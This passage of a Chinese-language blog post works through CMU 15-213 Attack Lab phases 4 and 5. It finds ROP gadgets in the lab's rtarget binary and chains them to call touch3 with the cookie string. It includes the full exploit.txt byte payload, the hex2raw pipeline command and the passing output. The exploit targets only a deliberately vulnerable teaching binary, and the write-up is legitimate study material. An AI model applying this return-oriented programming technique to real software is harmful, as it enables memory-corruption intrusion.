+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00 /* popq    %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* cookie */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* address of touch2 */</span><br></pre></td></tr></table></figure>
+<p>再将保存的<code>exploit.txt</code>输入到<code>rtarget</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./rtarget -q</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>完成。</p>
+<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><blockquote>
+<p>在进行<code>level 5</code>之前，请暂停思考你到目前为止已完成的工作。在<code>level 2</code>和<code>level 3</code>中，你使程序执行自己设计的机器代码。如果<code>ctarget</code>曾经是网络服务器，则可以将自己的代码注入到远程计算机中。在<code>level 4</code>中，你规避了现代系统用来阻止缓冲区溢出攻击的两个主要设备。尽管你没有注入自己的代码，但是你仍然可以注入一种程序，该程序通过将现有代码序列拼接在一起来运行。你还为此实验获得了95/100分。这是一个很好的成绩。如果你还有其他紧迫的任务，请考虑立即停止。</p>
+<p><code>level 5</code>要求你对<code>rtarget</code>进行ROP攻击，以使用指向<code>cookie</code>字符串表示形式的指针来调用函数<code>touch3</code>。除了使用ROP攻击来调用<code>touch2</code>之外，这似乎似乎没有那么困难。此外，第5阶段仅计5分，这并不是衡量其所需努力的真实指标。对于那些想要超越课程正常期望的人，将其视为额外的学分问题。</p>
+<p>要解决<code>level 5</code>，可以在函数<code>rstart_farm</code>和<code>end_farm</code>划分的<code>rtarget</code>中的代码区域中使用<code>gadget</code>。 除了在<code>levle 4</code>中使用的<code>gadget</code>之外，此扩展服务器场还包括不同<code>movl</code>指令的编码，如下图C所示。 服务器场此部分中的字节序列还包含2字节指令，这些指令用作功能上的<code>nop</code>，即它们不更改任何寄存器或内存值。这些指令包括下图D中所示的指令，例如<code>andb ％al，％al</code>，它们在某些寄存器的低位字节上运行，但不更改其值。<img src="Attack-Lab/%E5%9B%BE3C-D.png" alt="图3C-D"></p>
+<p>一些忠告：</p>
+<ul>
+<li>你需要查看<code>movl</code>指令对寄存器的高4位字节的影响。</li>
+<li>官方解决方案需要八个<code>gadget</code>（并非全部都是唯一的）。</li>
+</ul>
+<p>Good luck and have fun!</p>
+</blockquote>
+<p>目的与<code>level 3</code>相同，即传参为<code>cookie</code>值对应的字符串，区别是此时需要进行ROP攻击。</p>
+<p>回忆我们在<code>level 3</code>中编写的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x5561dca8,%rdi    # string</span><br><span class="line">push   $0x4018fa           # touch3</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>思路是先将<code>cookie</code>字符串的地址传入<code>%rdi</code>，再跳转到<code>touch3</code>地址即可。</p>
+<hr>
+<p>但此时栈地址是随机化的，导致我们无法直接获取字符串的地址。根据<code>level 4</code>的经验，我们需要从<code>gadget farm</code>中找到一个能将<code>%rsp</code>传出来的<code>gadget</code>。<img src="Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
+<p>观察上图，并寻找含有<code>48 89 e0</code>～<code>48 89 e7</code>的语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq  </span><br></pre></td></tr></table></figure>
+<p>此处的<code>48 89 e0 c3</code>对应：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq    %rsp,%rax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>地址为<code>401a03+3=401a06</code>。</p>
+<hr>
+<p>现在找到了一个<code>gadget</code>取出<code>%rsp</code>的值到<code>%rax</code>，但是还需要加上偏移量才是真正的字符串的地址，最终还需要把这两部分相加（起始地址+偏移量）赋给<code>%rdi</code>。</p>
+<p>观察<code>gadget farm</code>可以发现，有一个与众不同的<code>gadget</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq  </span><br></pre></td></tr></table></figure>
+<p>它正可以实现将<code>%rdi</code>和<code>%rsi</code>两个寄存器的值相加赋给<code>%rax</code>，地址为<code>4019d6</code>。</p>
+<hr>
+<p>发现这个<code>gadget</code>后，我们的思路更加清晰了：</p>
+<ul>
+<li>方案一：<ul>
+<li>首先利用<code>level 4</code>的方法，将偏移量弹出至<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>；</li>
+<li>其次用<code>401a06</code>将<code>%rsp</code>（起始地址）赋给<code>%rax</code>，再将<code>%rax</code>赋给<code>%rsi</code>（可能多次）；</li>
+<li>最后用<code>4019d6</code>将<code>%rdi</code>和<code>%rsi</code>相加赋给<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>。</li>
+</ul>
+</li>
+<li>方案二：<ul>
+<li>首先利用<code>level 4</code>的方法，将偏移量弹出至<code>%rax</code>，再将<code>%rax</code>赋给<code>%rsi</code>（可能多次）；</li>
+<li>其次用<code>401a06</code>将<code>%rsp</code>（起始地址）赋给<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>；</li>
+<li>最后用<code>4019d6</code>将<code>%rdi</code>和<code>%rsi</code>相加赋给<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>。</li>
+</ul>
+</li>
+</ul>
+<p>总之，现在需要一种（或多种组合）将<code>%rax</code>赋给<code>%rsi</code>的<code>gadget</code>。</p>
+<hr>
+<p><img src="Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
+<p><img src="Attack-Lab/%E5%9B%BE3C.png" alt="图3C"></p>
+<p><img src="Attack-Lab/%E5%9B%BE3D.png" alt="图3D"></p>
+<p>观察以上三图，寻找含有<code>89 c6</code>（<code>%eax</code>-&gt;<code>%esi</code>）的语句，遗憾的是并没有。</p>
+<p>再寻找含有<code>89 c0</code>～<code>89 c7</code>（<code>%eax</code>-&gt;）的语句：</p>
+<ul>
+<li><p>已知的<code>4019a2</code>可以将<code>%rax</code>赋给<code>%rdi</code>；</p>
+<ul>
+<li>再寻找含有<code>89 f8</code>～<code>89 ff</code>（<code>%edi</code>-&gt;）的语句，遗憾的是并没有。</li>
+</ul>
+</li>
+<li><p><code>getval_481</code>：（<code>%eax</code>-&gt;<code>%edx</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq </span><br></pre></td></tr></table></figure>
+<p>此处的<code>89 c2 90 c3</code>对应：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl    %eax,%edx</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>地址为<code>4019db+2=4019dd</code>。</p>
+<ul>
+<li><p>再寻找含有<code>89 d0</code>～<code>89 d7</code>（<code>%edx</code>-&gt;）的语句：</p>
+<p><code>getval_159</code>：（<code>%edx</code>-&gt;<code>%ecx</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401a38:	c3                   	retq </span><br></pre></td></tr></table></figure>
+<p>此处的<code>89 d1 38 c9 c3</code>对应：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl    %edx,%ecx</span><br><span class="line">cmpb    %cl,%cl</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>（<code>38 c9</code>可以忽略）地址为<code>401a33+1=401a34</code>。</p>
+<ul>
+<li><p>再寻找含有<code>89 c8</code>～<code>89 cf</code>（<code>%ecx</code>-&gt;）的语句：</p>
+<p><code>addval_436</code>：（<code>%ecx</code>-&gt;<code>%esi</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq </span><br></pre></td></tr></table></figure>
+<p>此处的<code>89 ce 90 90 c3</code>对应：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl    %ecx,%esi</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>地址为<code>401a11+2=401a13</code>。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>综上，找到了<code>%eax</code>-&gt;<code>4019dd</code>-&gt;<code>%edx</code>-&gt;<code>401a34</code>-&gt;<code>%ecx</code>-&gt;<code>401a13</code>-&gt;<code>%esi</code>。</p>
+<hr>
+<p>将得到的各个<code>gadget</code>进行总结：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">popq    %rax              # 4019ab</span><br><span class="line">                          # offset</span><br><span class="line">movl    %eax,%edx         # 4019dd</span><br><span class="line">movl    %edx,%ecx         # 401a34</span><br><span class="line">movl    %ecx,%esi         # 401a13</span><br><span class="line">movq    %rsp,%rax         # 401a06</span><br><span class="line">movq    %rax,%rdi         # 4019a2</span><br><span class="line">lea    (%rdi,%rsi,1),%rax # 4019d6</span><br><span class="line">movq    %rax,%rdi         # 4019a2</span><br><span class="line">                          # address of touch3</span><br><span class="line">                          # string of cookie</span><br></pre></td></tr></table></figure>
+<p>其中偏移量从<code>%rsp</code>读入开始计算，为<code>4*8=32=0x20</code>，<code>touch3</code>的地址为<code>4018fa</code>，<code>cookie</code>值对应的字符串的十六进制表示为<code>35 39 62 39 39 37 66 61 00</code>。</p>
+<hr>
+<p>编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00 /* popq    %rax */</span><br><span class="line">20 00 00 00 00 00 00 00 /* offset */</span><br><span class="line">dd 19 40 00 00 00 00 00 /* movl    %eax,%edx */</span><br><span class="line">34 1a 40 00 00 00 00 00 /* movl    %edx,%ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00 /* movl    %ecx,%esi */</span><br><span class="line">06 1a 40 00 00 00 00 00 /* movq    %rsp,%rax */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* address of touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 00 /* string of cookie */</span><br></pre></td></tr></table></figure>
+<p>再将保存的<code>exploit.txt</code>输入到<code>rtarget</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./rtarget -q</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<p>完成。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.superpung.xyz/Attack-Lab/" data-id="ckkyvzn6d002xhejb1cnq3j7g" data-title="Attack Lab: Understanding Buffer Overflow Bugs" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Computer-Systems/" rel="tag">Computer Systems</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Lab-Assignments/" rel="tag">Lab Assignments</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/Cache-Lab/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Cache Lab: Understanding Cache Memories
+        
+      </div>
+    </a>
+  
+  
+    <a href="/Data-Structures-Experiment-8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Data Structures Experiment #8</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Computer-Systems/" rel="tag">Computer Systems</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Data-Structures/" rel="tag">Data Structures</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Experiments/" rel="tag">Experiments</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lab-Assignments/" rel="tag">Lab Assignments</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Notes/" rel="tag">Notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Operating-Systems/" rel="tag">Operating Systems</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Others/" rel="tag">Others</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/Computer-Systems/" style="font-size: 16.67px;">Computer Systems</a> <a href="/tags/Data-Structures/" style="font-size: 18.33px;">Data Structures</a> <a href="/tags/Experiments/" style="font-size: 20px;">Experiments</a> <a href="/tags/Lab-Assignments/" style="font-size: 13.33px;">Lab Assignments</a> <a href="/tags/Notes/" style="font-size: 15px;">Notes</a> <a href="/tags/Operating-Systems/" style="font-size: 10px;">Operating Systems</a> <a href="/tags/Others/" style="font-size: 11.67px;">Others</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/VS-Code-Config/">VS Code on Windows Configuration_Notes</a>
+          </li>
+        
+          <li>
+            <a href="/macOS-PD-Ubuntu-20-04/">macOS&amp;Parallels_Desktop&amp;Ubuntu_20.04 Installation_Notes</a>
+          </li>
+        
+          <li>
+            <a href="/Win-VM-Ubuntu-20-04/">Windows&amp;VMware&amp;Ubuntu_20.04 Installation_Notes</a>
+          </li>
+        
+          <li>
+            <a href="/Xv6-homeworks/">Xv6 homeworks</a>
+          </li>
+        
+          <li>
+            <a href="/Theory-Study-3/">理论学习（三）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 SUPER<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
